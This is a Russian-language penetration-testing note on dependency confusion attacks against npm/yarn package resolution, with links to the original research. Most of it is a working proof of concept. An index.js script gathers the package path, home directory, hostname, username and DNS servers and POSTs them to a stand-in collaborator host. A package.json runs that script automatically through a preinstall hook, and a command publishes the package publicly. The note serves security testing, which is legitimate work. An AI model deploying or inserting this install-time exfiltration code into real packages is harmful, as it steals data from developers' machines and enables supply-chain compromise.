# Dependency Confusion Attack

Атака на цепочку поставок. Суть в том, что не используется контроль репозитория (должен быть зареган соответствующий покет в публичном registry) и контроль целостности пакета (хеш). Таким образом, мы можем зарегать пакет в публичном репозитории, и тот, кто его импортирует, исполнит наш код.

Оригинальный ресерч (скорее подсветил о проблеме, и как он ее раскручивал): [https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)

Ресерч — как сделать нагрузку и подтвердить уязвимость: [https://dhiyaneshgeek.github.io/web/security/2021/09/04/dependency-confusion/](https://dhiyaneshgeek.github.io/web/security/2021/09/04/dependency-confusion/)

## JS

Здесь есть три популярных менеджера пакетов: Yarn, NPM, pnpm.

Вероятно, если есть пакет в одном менеджере, то он будет и в другом (но это не точно: когда публиковал через yarn publish, команда запросила данные от npm и опубликовала в оба менеджера).

### Проверить пакет

Организации: [https://www.npmjs.com/org/babel](https://www.npmjs.com/org/babel)

Пакеты:

* [https://www.npmjs.com/package/lodash](https://www.npmjs.com/package/lodash)
* [https://www.npmjs.com/package/@babel/core](https://www.npmjs.com/package/@babel/core)
* [https://registry.yarnpkg.com/react](https://registry.yarnpkg.com/react)
* [https://registry.yarnpkg.com/@babel/core](https://registry.yarnpkg.com/@babel/core)

### PoC

index.js:

```javascript
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");

const packageJSON = require("./package.json");
const package_name = packageJSON.name;

const COLLABORATOR = 'tttttt.example.com'  // Collaborator

function poc() {
    const trackingData = JSON.stringify({
        p: package_name,
        c: __dirname,
        hd: os.homedir(),
        hn: os.hostname(),
        un: os.userInfo().username,
        dns: dns.getServers(),
        r: packageJSON ? packageJSON.___resolved : undefined,
        v: packageJSON.version,
        pjson: packageJSON,
    });
    
    var postData = querystring.stringify({
        msg: trackingData,
    });
    
    var options = {
        hostname: COLLABORATOR, //replace burpcollaborator.net with Interactsh or pipedream
        port: 443,
        path: "/",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": postData.length,
        },
    };
    
    var req = https.request(options, (res) => {
        res.on("data", (d) => {
            process.stdout.write(d);
        });
    });
    
    req.on("error", (e) => {
        // console.error(e);
    });
    
    req.write(postData);
    req.end();
}

poc();
```

package.json

```json
{
  "name": "@example/test",
  "author": {
    "name": "Ike Murami",
    "email": "murami.ike@gmail.com"
  },
  "scripts": {
    "preinstall": "node index.js"
  },
  "version": "0.0.1",
  "description": "My DI playground",
  "main": "index.js",
  "license": "MIT"
}
```

Публикация (как публичный пакет организации):

```
npm publish --access public
```
